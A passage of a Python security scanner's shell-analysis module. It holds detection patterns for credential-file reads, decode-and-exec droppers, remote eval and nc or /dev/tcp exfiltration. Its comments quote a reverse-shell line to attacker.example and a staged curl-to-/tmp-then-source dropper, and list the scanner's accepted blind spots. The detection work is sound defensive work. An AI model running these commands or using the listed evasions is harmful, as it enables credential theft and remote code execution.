# -- the `.ssh/id_` prefix family and the bare `id_rsa`/`id_ed25519` spellings matched a
# PUBLIC-key filename too (`id_rsa.pub`, `id_ed25519.pub`, an OpenSSH cert
# `id_rsa-cert.pub`). Fixed HERE, in the shared fragment, rather than only inline in
# `_SH_CRED_ASSIGN_RE` below, precisely because this fragment also feeds the loop-hop
# reader (`_SH_CRED_READ_PATH_RE`'s one call site) -- fixing only one consumer would
# have reopened the exact drift this fragment exists to prevent. Same negative-lookahead
# discipline B-898 proved for this shape.
_SH_CRED_READ_PATH_SRC = (
    r"\.ssh/id_[a-z0-9_]+(?![a-z0-9_]|\.pub\b|-cert\.pub\b)|"
    r"id_rsa(?!\.pub\b|-cert\.pub\b)|id_ed25519(?!\.pub\b|-cert\.pub\b)|"
    r"\.aws/credentials|\.netrc|keychain|wallet\.dat|"
    r"\.docker/config|\.kube/config|\.npmrc|\.pypirc|\.openclaw/|"
    r"\.(?:claude|codex|gemini)/mcp\.json\b"
)
_SH_CRED_READ_PATH_RE = re.compile(_SH_CRED_READ_PATH_SRC, re.I)
_SH_CRED_ASSIGN_RE = re.compile(
    r"(?P<var>[A-Za-z_][A-Za-z0-9_]{0,127})=[^\n]{0,256}?(?:cat|less|head|tail|<)\s*[^\n]{0,256}?"
    r"(?:" + _SH_CRED_READ_PATH_SRC + r")",
    re.I,
)

# B-415: shell-side counterparts of the Python in-cluster-auth exemption above
# (_INCLUSTER_TOKEN_PATH_RE / _INCLUSTER_API_HOST_RE are shared, module-level --
# same narrow token path, same narrow destination signal, defined once near
# _CRED_PATH_RE). Two DISTINCT legitimate shapes cause a false SHELL_CRED_EXFIL:
#
#   1. curl's own TLS-material flags (--cacert/--capath/--cert/--key/-E) name a
#      certificate/key file curl reads LOCALLY for the TLS handshake -- the raw
#      bytes are never placed in the request URL/body/headers the way a
#      credential VALUE would be (a CA cert only verifies the PEER; a client
#      cert/key is used cryptographically to sign a challenge, never
#      transmitted in the clear). This holds regardless of which file is named
#      or which host is being called, so this exemption is deliberately
#      POSITION-ONLY -- mirrors the Python side's _ENV_AUTH_KWARGS "cert" entry.
#   2. The narrow in-cluster token specifically, referenced ONLY inside a
#      -H/--header "Authorization: ..." value, on a line whose own destination
#      resolves to the cluster's own API server -- mirrors the Python side's
#      headers=/auth= position exemption. Unlike (1), this DOES need the
#      narrow-source + destination checks: an Authorization header's VALUE is
#      genuinely transmitted, so a generic credential (.ssh/.aws/etc.) or an
#      attacker-controlled destination must never qualify.
_SH_TLS_MATERIAL_FLAG_RE = re.compile(r"(?:--cacert|--capath|--cert|--key|-E)\s+")
_SH_AUTH_HEADER_RE = re.compile(r"(?:-H|--header)\s+(['\"])\s*Authorization\s*:.*?\1", re.I)
# ANY -H/--header value (not just Authorization) -- used to blank header text out
# of the destination search below, not to detect a credential match.
_SH_ANY_HEADER_VALUE_RE = re.compile(r"(?:-H|--header)\s+(['\"]).*?\1", re.I)
_SH_VAR_ASSIGN_RE = re.compile(r"^[ \t]*(?P<var>[A-Za-z_][A-Za-z0-9_]{0,127})=(?P<val>.*)$")
_SH_VAR_REF_RE = re.compile(r"\$\{?([A-Za-z_][A-Za-z0-9_]{0,127})\}?")


def _sh_var_mentions_incluster_host(masked: str, name: str) -> bool:
    """True if any top-level `name=...` assignment line in the WHOLE script
    mentions the in-cluster API server signal -- a text-substrate search (never
    a full value resolution), same limitation the Python side's simple
    `_simple_str_const_assigns` map has."""
    for m in _SH_VAR_ASSIGN_RE.finditer(masked):
        if m.group("var") == name and _INCLUSTER_API_HOST_RE.search(m.group("val")):
            return True
    return False


def _sh_line_destination_text(raw: str) -> str:
    """*raw* with every -H/--header flag's own quoted value, and every
    TLS-material flag's own path argument, blanked out (character positions
    preserved so this stays a drop-in substitute for *raw* in a search). C-135:
    a decoy destination string planted inside ANY header -- not just
    Authorization -- must never be able to confirm the destination; only text
    that can plausibly BE the outbound URL/body/positional arguments may."""
    spans = [m.span() for m in _SH_ANY_HEADER_VALUE_RE.finditer(raw)]
    for m in _SH_TLS_MATERIAL_FLAG_RE.finditer(raw):
        arg_end = m.end()
        while arg_end < len(raw) and not raw[arg_end].isspace():
            arg_end += 1
        spans.append((m.start(), arg_end))
    if not spans:
        return raw
    chars = list(raw)
    for start, end in spans:
        for i in range(start, min(end, len(chars))):
            chars[i] = " "
    return "".join(chars)


def _sh_candidate_destination_tokens(text: str) -> list:
    """Whitespace-split tokens from *text* that could plausibly BE curl's own
    outbound destination argument: a quoted/bare http(s) URL, or a variable
    reference (`$VAR`/`${VAR}`, optionally with a literal path suffix like
    `${API_SERVER}/api/...`). C-135: a flag (`-X`, `--foo`) or a bare word/
    trailing-comment fragment with no scheme and no variable reference is NEVER
    a candidate -- that closed a real gap where a decoy word like a bare
    `kubernetes.default.svc` floating anywhere on the line (not an actual URL
    argument at all), or the same text after an inline `#` comment, could
    confirm a destination curl never actually requests."""
    tokens = []
    for tok in text.split():
        t = tok.strip("'\"")
        if not t or t.startswith("-"):
            continue
        if t.lower().startswith(("http://", "https://")) or t.startswith("$"):
            tokens.append(t)
    return tokens


def _sh_line_has_incluster_destination(raw: str, masked: str) -> bool:
    """True if a candidate destination TOKEN (see `_sh_candidate_destination_tokens`)
    in the non-header, non-TLS-flag part of *raw* -- or a variable it references
    (resolved against the whole script's simple `VAR=...` assignments) -- mentions
    the cluster's own API server. Fails closed: an unresolvable variable, an
    opaque expression, or text that isn't even URL/variable-shaped is simply not
    a match, so the finding stays crit."""
    dest_text = _sh_line_destination_text(raw)
    for tok in _sh_candidate_destination_tokens(dest_text):
        if _INCLUSTER_API_HOST_RE.search(tok):
            return True
        for name in _SH_VAR_REF_RE.findall(tok):
            if _sh_var_mentions_incluster_host(masked, name):
                return True
    return False


def _sh_cred_match_is_incluster_auth_only(
    raw: str, masked: str, *, all_incluster_token: "bool | None" = None
) -> bool:
    """B-415/C-135: True only when EVERY `_SH_CRED_FILE_RE` match on *raw* is
    either (a) inside curl's own TLS-material flag argument (--cacert/--capath/
    --cert/--key/-E -- read locally for the handshake, never sent as request
    data), or (b) the narrow in-cluster service-account token specifically,
    referenced ONLY inside a -H/--header 'Authorization: ...' value, on a line
    whose own destination resolves to the cluster's own API server. A
    credential-path match ANYWHERE ELSE -- the URL, -d/--data body, a
    non-Authorization header, or a bare unflagged argument -- makes this return
    False, so the exemption can never launder a real exfil position. A generic
    secrets-mount or dotfile credential (not the exact service-account token
    path) never qualifies for (b), at any position or destination -- only the
    TLS-flag case (a) can ever apply to it.

    `all_incluster_token` (B-894 round 4, loop DIRECT role only): when not
    None, replaces the per-match `_INCLUSTER_TOKEN_PATH_RE` content test on
    *m.group(0)* with this precomputed, whole-word-list verdict. The loop role
    substitutes a single representative word for cost reasons (round 2) before
    calling this function; the TLS-material-flag arm above is sound to check
    with any one word since it never reads word content, but the in-cluster-
    token arm DOES read the substituted word's own text, so a representative
    word can only stand in for the FULL word list when every word in it is
    independently the in-cluster token path -- never for one word picked out of
    a MIXED list. Round 3's review found that padding a real credential path's
    loop word list with the harmless in-cluster token path made `min(file_words)`
    pick the token, exempting the whole line and laundering the real credential
    past this crit rule. Passing this keeps the exemption decided by one
    function for both the literal and loop forms (single source of truth) while
    letting the loop caller supply a content verdict it computed once per region
    instead of once per word."""
    matches = list(_SH_CRED_FILE_RE.finditer(raw))
    if not matches:
        return False
    auth_header_spans = [m.span() for m in _SH_AUTH_HEADER_RE.finditer(raw)]
    destination_ok: bool | None = None
    for m in matches:
        prefix = raw[: m.start()]
        flag_matches = list(_SH_TLS_MATERIAL_FLAG_RE.finditer(prefix))
        is_tls_flag_arg = False
        if flag_matches:
            between = prefix[flag_matches[-1].end() :]
            # The match must still be the SAME shell word the flag introduced --
            # no whitespace/segment-separator between the flag and the match
            # (the credential-path regex can match a SUFFIX of the path token,
            # e.g. the .../ca.crt case below, not always its very first char).
            if not re.search(r"[\s;&|]", between):
                is_tls_flag_arg = True
        if is_tls_flag_arg:
            continue
        is_incluster_token = (
            bool(_INCLUSTER_TOKEN_PATH_RE.search(m.group(0)))
            if all_incluster_token is None
            else all_incluster_token
        )
        in_auth_header = any(
            start <= m.start() and m.end() <= end for start, end in auth_header_spans
        )
        if is_incluster_token and in_auth_header:
            if destination_ok is None:
                destination_ok = _sh_line_has_incluster_destination(raw, masked)
            if destination_ok:
                continue
        return False
    return True


def _sh_word_is_incluster_token(word: str) -> bool:
    """B-894 round 4: True only when `_SH_CRED_FILE_RE`'s OWN match WITHIN *word*
    (not *word* itself) is the in-cluster token path -- the same text
    `_sh_cred_match_is_incluster_auth_only` would test via `m.group(0)` for a
    literal single-line match. This distinction matters because
    `_SH_CRED_FILE_RE`'s generic `/run/secrets/[^/\\s"']+` alternative (the
    Docker/Swarm secrets-mount catch-all) truncates a `/run/secrets/kubernetes.io/
    serviceaccount/token` word -- missing the `var/` prefix the exact literal
    in-cluster alternative requires -- down to just `/run/secrets/kubernetes.io`,
    which `_INCLUSTER_TOKEN_PATH_RE` does not match; the literal single-line form
    therefore convicts that spelling as an ordinary secrets-mount read, not an
    exempt in-cluster token. Testing `_INCLUSTER_TOKEN_PATH_RE` against the WHOLE
    word instead of `_SH_CRED_FILE_RE`'s own match would silently exempt that one
    spelling inside a loop while the literal form still convicts it -- a
    loop-broader-than-literal gap the design's own invariant forbids (found while
    verifying the round-4 fix, before it shipped -- never observed by a reviewer)."""
    m = _SH_CRED_FILE_RE.search(word)
    return bool(m) and bool(_INCLUSTER_TOKEN_PATH_RE.search(m.group(0)))


# decode-then-exec: an encoded blob is decoded (base64/xxd/openssl) and piped straight
# into a shell/interpreter — the classic obfuscated-RCE dropper. Encode (no -d) and
# decode-to-file (no `| interp`) stay silent.
_SH_DECODE_EXEC_RE = re.compile(
    r"\b(?:base64\s+-[a-z]*d[a-z]*|base64\s+--decode|xxd\s+-r|"
    r"openssl\s+(?:base64|enc)\b[^\n|]*?-d)"
    r"[^\n]*\|\s*(?:sudo\s+)?(?:sh|bash|zsh|ksh|dash|python3?|node|perl|ruby|php|deno)\b",
    re.I,
)
# eval/source of a remote download — `eval "$(curl … http…)"` / `source <(wget … http…)`.
# The tight, defensible slice of "$()-command-injection": only a remote fetch feeding
# eval/source fires (a bare $(…) or a local eval stays silent).
_SH_EVAL_REMOTE_RE = re.compile(
    r"\b(?:eval|source)\b[^\n]*(?:\$\(|<\()\s*(?:sudo\s+)?(?:curl|wget)\b[^\n)]*https?://",
    re.I,
)
# raw-socket outbound (nc//dev/tcp) — deliberately EXCLUDES curl/wget, which legitimately
# carry an auth header to an API. Sending a secret over a raw socket is not legitimate.
# B-341/B-430: same bare-`nc` history as _SH_OUTBOUND_RE above — see its comment. The
# bare-`nc` alternative lives in `_sh_bare_nc_invocation()` now, not in this regex.
_SH_RAW_SOCKET_RE = re.compile(r"\b(?:ncat|netcat)\b|/dev/tcp/", re.I)
# a credential-shaped env-var NAME (contains TOKEN/SECRET/API_KEY/…). Gating env->outbound
# on the name (not any $VAR) is what keeps this zero-FP against authed-API scripts.
# The credential-shaped NAME vocabulary, shared by the shell rule below and by
# `capability_families`' Python-side env read (B-592) so the two cannot drift into
# disagreeing about what "looks like a secret" — the divergent-table failure B-483
# documented for the ascii folder. `tests/test_b592_capability_presence.py` pins the
# shell pattern's rendered source, so rebuilding it from this fragment cannot silently
# change the rule it has always implemented.
_CRED_NAME_WORDS = (
    r"API_?KEY|SECRET|TOKEN|PASSWORD|PASSWD|CREDENTIAL|PRIVATE_?KEY|ACCESS_?KEY|AUTH"
)
_SH_CRED_ENV_RE = re.compile(
    r"\$\{?[A-Za-z0-9_]*"
    r"(?:" + _CRED_NAME_WORDS + r")"
    r"[A-Za-z0-9_]*\}?",
    re.I,
)
#: The same vocabulary against a bare identifier — `os.environ["API_TOKEN"]`, which
#: carries no `$`. Used only for capability PRESENCE, never for a finding.
_CRED_ENV_NAME_RE = re.compile(
    r"[A-Za-z0-9_]*(?:" + _CRED_NAME_WORDS + r")[A-Za-z0-9_]*", re.I
)

# B-430: metacharacters that can glue directly onto a word with no surrounding
# whitespace (`foo;nc`, `(nc`, `` `nc ``) get spaced out before whitespace-splitting, so
# an `nc` glued to a separator is still recognized as its own token. `)` is deliberately
# EXCLUDED from this list — see `_sh_bare_nc_invocation`'s case-label note below.
_SH_NC_METACHAR_RE = re.compile(r"([;&|(`])")
# A trailing token after `nc` that looks like a bare port number, tolerating whatever
# punctuation (`)`, `;`, a trailing quote/backtick) sits glued on the end with no space.
_SH_NC_PORT_RE = re.compile(r"^\d{1,5}[)\];,`\"']*$")
# A single combined `host:port` argument, same trailing-punctuation tolerance.
_SH_NC_HOSTPORT_RE = re.compile(r"^[\w.-]+:\d{1,5}[)\];,`\"']*$")
# Tokens that unambiguously start a new command segment — `nc` immediately after one of
# these is always in command position. `-exec` (find's own syntax: the word right after
# it is always the command name) rides along here rather than in the no-op prefix set
# below, since — unlike `sudo`/`env`/etc. — arbitrary `find` flags can sit between `find`
# and `-exec`, so `-exec` itself (not whatever precedes it) is the anchor.
_SH_NC_SEGMENT_START = frozenset(
    {";", "|", "&", "(", "`", "then", "do", "else", "elif", "!", "-exec"}
)
# No-op wrapper words: skipping backward over any of these (plus flag-shaped tokens and
# `VAR=val` prefix assignments, handled in `_sh_nc_command_position`) still counts as
# command position — covers `sudo nc …`, `command nc …`, `env FOO=bar nc …`,
# `eval "nc …"`, `xargs -n1 nc …`.
_SH_NC_NOOP_PREFIX = frozenset(
    {
        "sudo",
        "exec",
        "command",
        "nohup",
        "time",
        "nice",
        "ionice",
        "stdbuf",
        "setsid",
        "eval",
        "env",
        "xargs",
    }
)
_SH_NC_VAR_ASSIGN_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=\S*$")


def _sh_nc_word(tok: str) -> str:
    """Normalize one whitespace/metachar-delimited shell word for bare-`nc` identity
    comparison. Strips surrounding quote characters, a single leading backslash (the
    `\\nc` alias/function-shadow bypass — backslash-escaping a command name to skip a
    shell alias or function of the same name is a real, documented evasion, not a corner
    case), and a single leading bare `$` (the deliberately-preserved `$NC` alias-
    invocation residual carried over from B-341 round 2 — `NC=nc; $NC host 4444` is a
    real evasion with no sound way to distinguish it from a bare color-reset variable at
    the token level, so it is intentionally still treated as `nc`, same as before).
    Braced `${NC}` is NOT unwrapped by the `$`-strip (the leading `{` blocks it), so it
    stays unambiguous parameter expansion and never compares equal to a bare `nc`."""
    t = tok.strip("'\"")
    if t.startswith("\\"):
        t = t[1:]
    if t.startswith("$") and not t.startswith("${"):
        t = t[1:]
    return t


def _sh_nc_command_position(words: list, i: int) -> bool:
    """True if `words[i]` sits where a shell COMMAND NAME can appear: at the start of the
    line/segment, or reached by skipping backward only over no-op wrapper words
    (`_SH_NC_NOOP_PREFIX`), `VAR=val` prefix assignments, and flag-shaped tokens (`-n1`,
    `-u`, …) — covering `sudo nc …`, `env FOO=bar nc …`, `xargs -n1 nc …`, `eval "nc …"`,
    and (via `_SH_NC_SEGMENT_START`) `find … -exec nc …`. Any other word in between (a
    filename, `for`, `case`, a trailing-comment `#`, …) blocks it — this is what excludes
    the `case … in` / `nc)` pattern label, the `for nc in …` loop variable, and an `nc`
    mentioned inside a trailing inline comment (masking only blanks WHOLE-LINE comments;
    see `_sh_mask_comments`)."""
    j = i - 1
    while j >= 0:
        w = words[j]
        low = w.lower()
        if w in _SH_NC_SEGMENT_START or low in _SH_NC_SEGMENT_START:
            return True
        if low in _SH_NC_NOOP_PREFIX:
            j -= 1
            continue
        if w.startswith("-") and len(w) > 1:
            j -= 1
            continue
        if _SH_NC_VAR_ASSIGN_RE.match(w):
            j -= 1
            continue
        return False
    return True


def _sh_nc_arg_follows(words: list, i: int) -> bool:
    """True if the word(s) after `words[i]` look like real `nc` arguments: a flag (`-e`,
    `-lvp`, …) anywhere in the next few words (covers a port-before-flag ordering, e.g.
    an `xargs`-appended arg landing before an explicit `-e`), a combined `host:port`, or
    a bare host word followed by a numeric port word (`nc attacker.example 4444`) —
    excluding a case-label's `)`, an arithmetic reference, or ordinary prose (a trailing
    comment's next English word)."""
    window = [w.strip("'\"") for w in words[i + 1 : i + 4]]
    if not window:
        return False
    if any(w.startswith("-") and len(w) > 1 for w in window):
        return True
    nxt = window[0]
    if _SH_NC_HOSTPORT_RE.match(nxt):
        return True
    if not nxt.startswith("-") and len(window) >= 2 and _SH_NC_PORT_RE.match(window[1]):
        return True
    return False


def _sh_bare_nc_invocation(line: str) -> bool:
    """B-430: whole-token, position-aware replacement for the bare-`nc` alternative that
    used to live inside `_SH_OUTBOUND_RE`/`_SH_RAW_SOCKET_RE` as
    `(?<![{-])\\bnc\\b(?!\\s*=)`.

    Four prior C-135 rounds each patched that lookbehind for one collision at a time
    (`${NC}`, then `-nc`/`jq -nc`), and none of them could have caught this ticket's gap:
    a single-character lookbehind can exclude at most one preceding character, but `.`,
    `/`, `(`, `[`, `;`, `#` are ALL valid `\\b` left-boundaries for a bare `nc` that a
    lookbehind-only design can never enumerate completely (the highest-value miss is the
    `.nc` file extension — NetCDF and CNC G-code both use it, and any path ending `.nc`
    sits right after a `.`). Rather than add yet another excluded character, bare-`nc`
    detection moves to an isolated shell WORD + command-position + argument-shape check:

      1. `nc` must be its OWN whitespace/metachar-delimited token, not a substring of a
         longer one. This alone kills the whole `.nc`/`/nc/`/`${nodes[nc]}`/
         `nc=$((nc+1))` collision class — none of those is ever a standalone token.
      2. It must sit in COMMAND POSITION (`_sh_nc_command_position`) — excludes the
         `case … in` / `nc)` pattern label and the `for nc in …` loop variable, both real
         standalone tokens that are never a command name.
      3. It must be followed by an argument-shaped token (`_sh_nc_arg_follows`) — a
         second, independent signal that excludes an `nc` mentioned in a trailing inline
         comment (`curl ... # nc is not used here` still reaches this scan, since
         `_sh_mask_comments` only blanks WHOLE-LINE comments); ordinary English prose
         after `nc` is essentially never flag- or host:port-shaped.

    The deliberately-preserved `$NC`-alias-invocation residual from B-341 round 2 carries
    over unchanged (see `_sh_nc_word`): `NC=nc; $NC host 4444 -e /bin/sh` still matches,
    braced `${NC}` still doesn't. Adding the command-position requirement actually makes
    this residual NARROWER, not just relocated: a bare `echo "$NC"` (unbraced, but not in
    command position either) no longer matches, where the old position-blind regex would
    have.

    C-135 (this round) considered also closing three narrower gaps inside this same
    function; all three were retracted per CLAUDE.md §2.5, documented here rather than
    attempted a 6th narrow-regex-style iteration:

      - `sudo -u root nc …` — an option VALUE (`root`), not a flag, sits between the
        wrapper and `nc`. Distinguishing an option's VALUE from a bare positional
        argument needs per-command flag-arity knowledge (`-u` takes a value on `sudo`,
        `-name`'s value on `find` sits the same way) this generic token scanner cannot
        have without becoming unsound for some OTHER wrapper's flags.
      - general variable-reconstruction (`cmd="n"; cmd+="c"; $cmd …`) — needs real
        data-flow tracking this per-line, non-parsing scanner has never had.
      - `xargs nc 4444` with only ONE static numeric argument and no explicit `-I{}`
        placeholder — relies on xargs's default behavior of APPENDING the piped-in value
        as the LAST argument, which would actually run `nc 4444 <host>`. Per `nc(1)`,
        the positional syntax is `nc [flags] [destination] [port]` — destination first —
        so that argument ORDER is not a functionally valid exfiltration payload in the
        first place; `xargs -I{} nc {} 4444 …` (explicit placeholder, syntactically
        correct) is still caught (see tests).

    None of these are a NEW gap this change introduces: the OLD `\\bnc\\b`
    search-anywhere regex textually matched all three (it doesn't care what follows), so
    strictly it "caught" them, but the first two were never reachable exploits without a
    real shell/data-flow engine this scanner doesn't have, and the third isn't a working
    payload as written. All three remain accepted, documented blind spots of a
    stdlib-only, non-parsing, per-line shell scanner — not silently dropped."""
    if "nc" not in line.lower():
        return False
    words = _SH_NC_METACHAR_RE.sub(r" \1 ", line).split()
    for i, tok in enumerate(words):
        if _sh_nc_word(tok).lower() != "nc":
            continue
        if not _sh_nc_command_position(words, i):
            continue
        if _sh_nc_arg_follows(words, i):
            return True
    return False


# B-341: the original false-condemnation repro attributed to THIS check (SkillTrustBench
# unifi-api.sh, case_01666/case_04964) was `jq -nc --arg password "$PASS"
# '{...,password:$password}'` matching SHELL_ENV_EXFIL — but the actual trigger turned
# out to be `_SH_RAW_SOCKET_RE` matching "nc" inside jq's own `-nc` (`-n -c`) combined
# short-flag cluster, NOT a real credential-var/raw-socket pairing. Once the bare-`nc`
# matching (now `_sh_bare_nc_invocation`, née the `_SH_OUTBOUND_RE`/`_SH_RAW_SOCKET_RE`
# lookbehind — see B-430 above) stopped matching a bare `nc` immediately preceded by `-`
# (a flag cluster on some OTHER command) or `{` (a `${NC}` variable reference), that
# match no longer fires on `-nc` at all — this SHELL_ENV_EXFIL check is never even
# reached for it, so both corpus cases are already resolved. VERIFIED empirically against
# the real fixture content, not assumed.
#
# Four independent rounds (C-135) were spent trying to ALSO add quote/jq-template
# awareness directly to this check specifically, on the (incorrect) assumption that the
# credential-var-in-jq-template shape itself needed excluding here. Each attempt (a
# same-line parity count, a blob-wide bash quote-state machine, a narrow jq-`'{...}'`
# regex, a proper bash lexer) was retracted after breaking some other real case — full
# history preserved in `checks._vet._redirect_targets_file`'s docstring, whose sibling
# fix (the comment-line redirect exclusion) DOES have a genuine remaining residual.
# Nothing from those four rounds landed here: the bare-`nc` narrowing above was
# sufficient on its own, and this check is otherwise pre-B-341 behavior, unchanged.


# B-284: SHELL_EVAL_REMOTE above only covers the INLINE form — `eval "$(curl … http…)"`,
# `source <(wget … http…)`. The STAGED form writes the payload to a path first and runs
# that path on a later line:
#
#     CONFIG_URL="https://185.45.12.99/config/skill.json"
#     curl -fsSL "$CONFIG_URL" -o /tmp/_skill_config.sh
#     source /tmp/_skill_config.sh
#
# Semantically identical to `source <(curl …)`, invisible to every inline pattern, and
# the real shape of three SkillTrustBench dropper cases (case_00110 / case_02509 /
# case_03702). Before B-284 the only reason those FAILed B13 was F-021 matching an
# unrelated word elsewhere in the package, so tightening F-021 exposed the gap — closed
# here, where the signal actually is.
#
# Two independent signals must line up, which is what keeps it precise: a download whose
# OUTPUT PATH is a literal, and a later execution naming that SAME literal path. A script
# that merely downloads a file, or merely sources a local file, never fires.
# B-284 round 2 (independent C-135 finding): `-o\s+`/`-O\s+` only matches an output flag
# written on its own, so the extremely common COMBINED short-flag cluster — `wget -qO
# /tmp/x.sh <url>`, `curl -fsSLo /tmp/x.sh <url>` — evaded the rule entirely, including
# the path-before-URL ordering. `-(?!-)[A-Za-z]{0,8}[oO]` accepts a cluster of no-argument
# short flags ending in o/O; the `(?!-)` keeps `--output` on its own explicit alternative
# and stops a long-option name from being mined for a stray `o`.
_SH_DOWNLOAD_TO_PATH_RE = re.compile(
    r"\b(?:curl|wget)\b[^\n]{0,256}?"
    r"(?:-(?!-)[A-Za-z]{0,8}[oO]\s+|--output[= ]\s*|>\s*)"
    r"(?P<path>[\"']?[\w./$~{}-]{2,128}[\"']?)",
    re.I,
)
# B-284 round 2: the download line's own literal URL, used to apply the same C-224/B-118
# first-party installer allowlist DROPPER_DOWNLOAD_TO_TMP already applies to the identical
# shape. Without it, `curl -o /tmp/rustup.sh https://sh.rustup.rs` + `sh /tmp/rustup.sh`
# was crit while the piped form of the SAME url passes — an inconsistency, and a real
# false positive on any skill that documents a rustup/uv/nvm install in two steps.
_SH_LINE_URL_RE = re.compile(r"https?://[^\s\"'<>|)]{4,512}")
# The URL may sit on the same line or come from a variable assigned earlier, so the
# download line itself is not required to carry an http literal — see _sh_staged_exec.
_SH_RUN_PATH_RE = re.compile(
    r"(?:^|[\n;&|]|\b(?:then|do|else)\s+)\s*(?:sudo\s+)?"
    r"(?:source|\.|bash|sh|zsh|python3?|node|perl|ruby)\s+"
    r"(?P<path>[\"']?[\w./$~{}-]{2,128}[\"']?)",
    re.I,
)
_SH_HTTP_RE = re.compile(r"https?://", re.I)


def _sh_norm_path(raw: str) -> str:
    """Strip quotes/whitespace so `"/tmp/x.sh"` and `/tmp/x.sh` compare equal."""
    return raw.strip().strip("\"'")


def _sh_staged_exec(masked: str) -> list[tuple[int, str]]:
    """B-284: (lineno, path) for every download-to-a-literal-path that is later executed
    by that same path. Requires an http(s) URL somewhere in the script — a purely local
    copy-then-run is ordinary tooling, not a remote payload."""
    if not _SH_HTTP_RE.search(masked):
        return []
    staged: dict[str, int] = {}
    for m in _SH_DOWNLOAD_TO_PATH_RE.finditer(masked):
        p = _sh_norm_path(m.group("path"))
        # A bare `-o -` (stdout) or a flag swallowed as a path is not a staged file.
        if p in {"-", ""} or p.startswith("-"):
            continue
        # B-284 round 2: inherit DROPPER_DOWNLOAD_TO_TMP's C-224 allowlist for the
        # identical shape. Only a LITERAL first-party installer URL on this same line
        # skips; a URL held in a variable is unknowable here and stays staged (fail
        # closed), exactly as the argv-list twin behaves.
        line_start = masked.rfind("\n", 0, m.start()) + 1
        line_end = masked.find("\n", m.start())
        line = masked[line_start : line_end if line_end != -1 else len(masked)]
        url_literals = _SH_LINE_URL_RE.findall(line)
        if url_literals and all(_is_trusted_installer_url(u) for u in url_literals):
            continue
        staged.setdefault(p, masked.count("\n", 0, m.start()) + 1)
    if not staged:
        return []
    found: list[tuple[int, str]] = []
    for m in _SH_RUN_PATH_RE.finditer(masked):
        p = _sh_norm_path(m.group("path"))
        if p in staged:
            found.append((masked.count("\n", 0, m.start()) + 1, p))
    return found


# --- B-894: loop-variable credential taint ------------------------------------------
# SHELL_CRED_EXFIL above reads credential-shaped PATHS and VARIABLE NAMES on a single
# raw line. Neither sees a `for V in <words>; do BODY; done` loop: V is never a path
# literal on the sink line, and no `_SH_CRED_ASSIGN_RE`-shaped assignment names it
# directly. case_01341/case_03412 (AR_AGENT_RECON) read `~/.claude/mcp.json` this way.
#
# B-894 replaces three superseded fix/b-894 rounds (d98481ae, 57a42d93,
# 3ac8dc1b) that each built a new, general straight-line dataflow engine and each
# introduced a fresh false positive the next C-135 review found (two sources of truth
# for "is V credential-bound", the loop variable's scope modeled file-wide instead of
# as the loop body, the loop form seeded from a WIDER vocabulary than the literal rule
# it generalizes, and a header seeded from inside string/heredoc text).
#
# INVARIANT (pinned by tests/test_b894_shell_loop_cred_taint.py): a
# `for V in <literal words>; do BODY; done` loop is sugar for BODY repeated with V
# replaced by each word. This engine adds ONLY what the UNCHANGED literal rules above
# (`_SH_CRED_FILE_RE` / `_SH_CRED_ASSIGN_RE` / `_sh_cred_match_is_incluster_auth_only`)
# would convict on that unrolled text, and is NEVER broader than them — every role below
# uses exactly the literal rule's own vocabulary and exemption for that role. There is
# no independent taint model for V itself: no seeded dict, no fallback, no "which of two
# states wins" question. V is covered structurally, by loop-body region, and nothing
# else. A reviewer repro is therefore either an invariant violation (a bug here, fix
# it) or it FAILs identically in its literal twin (the literal rule's own pre-existing
# behavior, not this one's — filed separately, e.g. B-934/935/936).
#
# Deliberately out of scope (FN; the literal analogue is also PASS or out of scope, so
# nothing regresses): a reference to V after `done` (including the "break" idiom), a
# second hop (`local X=$(cat "$V"); D="$D$X"`), `printf -v`, `eval`, base64, arrays,
# `while read`, `select`, tmpfiles, `$(for …)` capture, and a helper function defined
# above the loop and called after it (X's taint is positional, not call-graph aware).
# Any file whose `do`/`done` structure does not balance (a stray `done)` case label, an
# unmatched `do`) is skipped ENTIRELY — fails closed to PASS, never a guess.
#
# Vocabulary alignment (design §2.5): `_SH_CRED_READ_PATH_RE` (defined next to
# `_SH_CRED_ASSIGN_RE` above) is the literal hop rule's own vocabulary, now including
# the recon-grounded foreign-agent MCP configs (`~/.claude/mcp.json` etc.) B61 already
# treats as credential stores. The generic `_SH_CRED_FILE_RE` `.config/<app>/`
# alternative is deliberately NOT part of this vocabulary: replacing `claw` with any
# other app name in that alternative produces an indistinguishable, benign own-app
# config-backup shape (`for f in ~/.config/myapp/*.json; do D="$D$(cat "$f")"; done;
# curl --data "$D" https://own/backup`), and the destination is not an input to this
# scanner — so no rule can convict on that signal without convicting the benign
# backup too. Both stay PASS under this design.
_SH_LOOP_CONTINUATION_RE = re.compile(r"(?<!\\)((?:\\\\)*)\\\n")
# A heredoc body is not code that runs as a `for` loop in THIS shell — it is either
# inert data, or (if later fed to a shell) a CHILD shell's code, same reasoning as
# `bash -c '…'` below. Blanking it here, on the un-masked text, closes the branch's
# heredoc residual (a loop header written only inside a heredoc body must never seed).
_SH_LOOP_HEREDOC_RE = re.compile(r"<<(-?)[ \t]*(['\"]?)([A-Za-z_][A-Za-z0-9_]*)\2")


def _sh_loop_join_continuations(text: str) -> str:
    """Same-length join of `\\`-newline continuations (2 spaces for the 2 characters
    removed), so every offset — and so every LINE NUMBER against the original text —
    computed against the joined result is still valid against the pre-join text."""
    return _SH_LOOP_CONTINUATION_RE.sub(lambda m: m.group(1) + "  ", text)


def _sh_loop_blank_heredocs(text: str) -> str:
    """Blank every heredoc BODY line (through its delimiter line) to spaces, same
    length, same line count. `<<-WORD` also strips leading tabs before comparing to the
    delimiter, matching the shell's own `<<-` semantics."""
    lines = text.split("\n")
    out = []
    pending: list = []
    for ln in lines:
        if pending:
            strip_tabs, delim = pending[0]
            probe = ln.lstrip("\t") if strip_tabs else ln
            out.append(" " * len(ln))
            if probe == delim:
                pending.pop(0)
            continue
        out.append(ln)
        for m in _SH_LOOP_HEREDOC_RE.finditer(ln):
            pending.append((m.group(1) == "-", m.group(3)))
    return "\n".join(out)


def _sh_loop_code_mask(text: str) -> str:
    """Blank literal text inside `'…'`/`"…"` (never code inside a nested `$(…)` or
    backtick substitution) and inline `#` comments, same length. Used ONLY to locate
    loop/bind/do-done STRUCTURE below — values and references are always read from the
    un-masked `text`, never from this result. A `for` keyword sitting inside a quoted
    string (`bash -c "for f in …"`) is blanked here along with the rest of that string's
    text, so it is structurally invisible to the loop-header search — this is what
    keeps a header written only inside string text (a child shell's own code) from
    seeding, with no special-cased lookbehind needed."""
    out = list(text)
